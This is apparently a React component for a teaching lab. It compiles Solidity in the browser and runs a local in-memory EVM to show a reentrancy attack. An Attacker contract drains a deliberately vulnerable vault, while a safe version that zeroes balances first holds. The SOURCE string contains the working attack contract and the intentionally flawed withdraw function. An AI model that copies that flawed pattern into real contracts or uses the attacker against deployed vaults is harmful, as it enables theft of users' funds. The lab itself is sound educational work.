"use client";

// Run the bug. This is the teaching artifact you can only build because there's a
// real EVM in the browser: deploy a vault, let honest people fund it, then deploy
// an attacker contract and actually watch it drain the vault through reentrancy —
// then flip one line (effects before interactions) and watch the same attack
// bounce off. No animation, no hand-waving: real solc, real bytecode, real revert.
//
// The vulnerable and safe vaults differ by exactly one swap (zero the balance
// before vs after the external call). The attacker is identical for both; its
// receive() tries to re-enter withdraw() and just swallows the revert on the safe
// vault, so the contrast is clean: drained to zero, or honest funds untouched.
import { useMemo, useState } from "react";
import { PREFUNDED_ACCOUNTS, createMemoryClient } from "tevm";
import { type Abi, formatEther, parseEther } from "viem";
import { compileContracts } from "~~/lib/solc";

const SOURCE = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract VulnerableVault {
    mapping(address => uint256) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "no funds");
        (bool ok, ) = msg.sender.call{value: bal}("");   // interaction FIRST — the bug
        require(ok, "send failed");
        balances[msg.sender] = 0;                         // effect, too late
    }
}

contract SafeVault {
    mapping(address => uint256) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "no funds");
        balances[msg.sender] = 0;                         // effect FIRST — the fix
        (bool ok, ) = msg.sender.call{value: bal}("");
        require(ok, "send failed");
    }
}

contract Attacker {
    IVault public vault;
    uint256 public hits;
    constructor(address v) { vault = IVault(v); }
    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }
    receive() external payable {
        if (hits < 10 && address(vault).balance >= msg.value) {
            hits++;
            try vault.withdraw() {} catch {}
        }
    }
}
`;

type Result = {
  honest: string;
  stake: string;
  vaultAfter: string;
  attackerAfter: string;
  drained: boolean;
};

type Compiled = { abi: Abi; bytecode: `0x${string}` };

type TevmContractFn = (p: {
  to: string;
  abi: Abi;
  functionName: string;
  args: readonly unknown[];
  from: string;
  value?: bigint;
  createTransaction: true;
  addToBlockchain: true;
}) => Promise<{ errors?: Array<{ message?: string }> }>;

export function ReentrancyLab() {
  const [busy, setBusy] = useState(false);
  const [scenario, setScenario] = useState<"vulnerable" | "safe" | null>(null);
  const [result, setResult] = useState<Result | null>(null);
  const [error, setError] = useState<string | null>(null);
  // cache the compile across both runs — solc-in-browser is the slow part
  const compiledRef = useMemo<{ current: Record<string, Compiled> | null }>(() => ({ current: null }), []);

  async function run(which: "vulnerable" | "safe") {
    setBusy(true);
    setError(null);
    setScenario(which);
    setResult(null);
    try {
      if (!compiledRef.current) {
        const res = await compileContracts({ "Reentrancy.sol": SOURCE });
        if (!res.ok) throw new Error(res.errors[0] ?? "compile failed");
        compiledRef.current = res.contracts as unknown as Record<string, Compiled>;
      }
      const c = compiledRef.current;
      const vaultArt = which === "vulnerable" ? c.VulnerableVault : c.SafeVault;
      const attackerArt = c.Attacker;
      if (!vaultArt || !attackerArt) throw new Error("missing compiled artifact");

      const client = createMemoryClient({ miningConfig: { type: "auto" } });
      const deployer = PREFUNDED_ACCOUNTS[0];
      const honestA = PREFUNDED_ACCOUNTS[3];
      const honestB = PREFUNDED_ACCOUNTS[4];
      const attackerEoa = PREFUNDED_ACCOUNTS[5];
      const send = client.tevmContract as unknown as TevmContractFn;

      // deploy the vault
      const vHash = await client.deployContract({
        abi: vaultArt.abi,
        bytecode: vaultArt.bytecode,
        account: deployer,
        chain: null,
      });
      const vaultAddress = (await client.waitForTransactionReceipt({ hash: vHash })).contractAddress as `0x${string}`;

      // two honest contributors fund it (3 ETH each)
      for (const who of [honestA, honestB]) {
        const r = await send({
          to: vaultAddress,
          abi: vaultArt.abi,
          functionName: "deposit",
          args: [],
          value: parseEther("3"),
          from: who.address,
          createTransaction: true,
          addToBlockchain: true,
        });
        if (r.errors?.length) throw new Error(r.errors[0]?.message ?? "deposit failed");
      }

      // deploy the attacker pointed at the vault
      const aHash = await client.deployContract({
        abi: attackerArt.abi,
        bytecode: attackerArt.bytecode,
        args: [vaultAddress],
        account: attackerEoa,
        chain: null,
      });
      const attackerAddress = (await client.waitForTransactionReceipt({ hash: aHash }))
        .contractAddress as `0x${string}`;

      // attacker stakes 1 ETH and pulls the trigger
      const atk = await send({
        to: attackerAddress,
        abi: attackerArt.abi,
        functionName: "attack",
        args: [],
        value: parseEther("1"),
        from: attackerEoa.address,
        createTransaction: true,
        addToBlockchain: true,
      });
      // on the safe vault the attack may simply complete with no theft; only treat
      // a hard revert as an error if it isn't the expected "no funds" reentry guard
      if (atk.errors?.length && which === "vulnerable") {
        throw new Error(atk.errors[0]?.message ?? "attack failed");
      }

      const [vaultAfter, attackerAfter] = await Promise.all([
        client.getBalance({ address: vaultAddress }),
        client.getBalance({ address: attackerAddress }),
      ]);

      setResult({
        honest: "6",
        stake: "1",
        vaultAfter: trim(formatEther(vaultAfter)),
        attackerAfter: trim(formatEther(attackerAfter)),
        drained: vaultAfter < parseEther("6"),
      });
    } catch (e) {
      setError((e as Error).message);
    } finally {
      setBusy(false);
    }
  }

  return (
    <div className="rx">
      <div className="rx-intro">
        Six ETH of honest contributions sit in a vault. An attacker stakes just <strong>1 ETH</strong>. Run each version
        of <code className="rich-code">withdraw()</code> and watch what the attacker walks away with.
      </div>

      <div className="rx-runs">
        <button className="deck-btn rx-run rx-run-bad" disabled={busy} onClick={() => run("vulnerable")}>
          {busy && scenario === "vulnerable" ? "running…" : "▶ run the vulnerable withdraw"}
        </button>
        <button className="deck-btn rx-run rx-run-good" disabled={busy} onClick={() => run("safe")}>
          {busy && scenario === "safe" ? "running…" : "▶ run the safe withdraw"}
        </button>
      </div>

      {error && <p className="rx-error deck-mono">couldn&apos;t run: {error}</p>}

      {result && scenario && (
        <div className={`rx-result ${result.drained ? "rx-result-bad" : "rx-result-good"}`}>
          <div className="rx-result-head deck-mono">
            {scenario === "vulnerable" ? "vulnerable vault" : "safe vault"} · {result.drained ? "drained" : "held"}
          </div>
          <div className="rx-rows">
            <Row label="honest funds in vault" value={`${result.honest} ETH`} />
            <Row label="attacker staked" value={`${result.stake} ETH`} />
            <Row label="vault holds now" value={`${result.vaultAfter} ETH`} strong />
            <Row label="attacker walked away with" value={`${result.attackerAfter} ETH`} strong />
          </div>
          <p className="rx-verdict">
            {result.drained ? (
              <>
                The external call ran <em>before</em> the balance was zeroed, so the attacker&apos;s{" "}
                <code className="rich-code">receive()</code> re-entered <code className="rich-code">withdraw()</code>{" "}
                over and over on a balance that still read full. One ETH in, the whole vault out.
              </>
            ) : (
              <>
                Zeroing the balance <em>before</em> the call means the re-entrant{" "}
                <code className="rich-code">withdraw()</code> sees zero and reverts. The attacker gets back only its own
                stake; the honest funds never move.
              </>
            )}
          </p>
        </div>
      )}
    </div>
  );
}

function Row({ label, value, strong }: { label: string; value: string; strong?: boolean }) {
  return (
    <div className="rx-row">
      <span className="deck-mono rx-row-label">{label}</span>
      <span className={`deck-mono rx-row-value ${strong ? "rx-row-strong" : ""}`}>{value}</span>
    </div>
  );
}

function trim(s: string): string {
  return Number(s).toLocaleString(undefined, { maximumFractionDigits: 3 });
}
